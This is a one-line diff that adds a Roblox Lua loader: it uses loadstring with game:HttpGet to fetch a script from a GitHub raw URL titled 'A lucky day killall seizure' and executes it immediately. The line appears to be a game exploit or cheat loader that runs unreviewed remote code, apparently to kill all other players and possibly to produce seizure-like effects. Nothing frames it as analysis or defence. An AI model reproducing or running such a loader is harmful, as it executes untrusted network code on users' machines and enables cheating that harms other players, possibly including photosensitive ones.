@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AtomGotIce/Scripts/main/A%20lucky%20day%20killall%20seizure"))()
